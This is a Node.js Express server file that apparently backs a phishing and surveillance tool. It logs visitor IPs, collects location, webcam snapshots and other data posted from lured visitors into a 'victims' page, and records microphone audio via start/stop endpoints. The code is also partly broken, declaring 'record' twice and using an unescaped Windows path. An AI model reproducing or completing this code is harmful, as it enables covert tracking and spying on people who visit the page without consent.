const fs = require("fs");
const express = require("express");
const record = require('node-record-lpcm16');
var bodyParser = require('body-parser');
const base64ToImage = require('base64-to-image');
const record = require('node-record-lpcm16');
const { Writable } = require('stream');
const config=require('./app').config;
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(express.static("public"));
app.set("view engine", "ejs");
app.get("/", (req, res) => {
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.render("index",{ip:ip,time:d,redirect:config.redirectURL,camera:config.camera,cams:config.camsnaps,location:config.location});
fs.appendFile('./views/log.txt',"Visit Form: "+ip+" | At:"+d+"\n\n", function (err) {
if (err) throw err;
});
});
app.get("/victims",(req,res)=>{res.render("victims");});
app.post("/",(req,res)=>{
fs.appendFile('./views/victims.ejs', decodeURIComponent(req.body.data)+"\n\n", function (err) {
if (err) throw err;
console.log('Saved!');
res.send("Done");
});
});
app.post("/camsnap",(req,res)=>{
const path = './public/images/';
const { imageType, fileName } = base64ToImage( decodeURIComponent(req.body.img), path,{ type: 'png' }) 
res.send(fileName);
});


const recording = record.start({
  sampleRateHertz: 16000,
  threshold: 0,
  verbose: false,
  recordProgram: 'rec',
});

const fileWriterStream = new Writable({
  write(chunk, encoding, callback) {
    // Write the audio data to a file
    fs.appendFile('C:\Users\ADMIN\Downloads\Psi-main\Psi-main\video', chunk, function (err) {
      if (err) throw err;
      console.log('The audio data was written to the file!');
      callback();
    });
  }
});


app.get('/startRecording', (req, res) => {
  recording.pipe(fileWriterStream);
  res.send('Started recording');
});

app.get('/stopRecording', (req, res) => {
  recording.stop();
  res.send('Stopped recording');
});

app.listen(5000, () => {
  console.log('App running on port 5000');
});

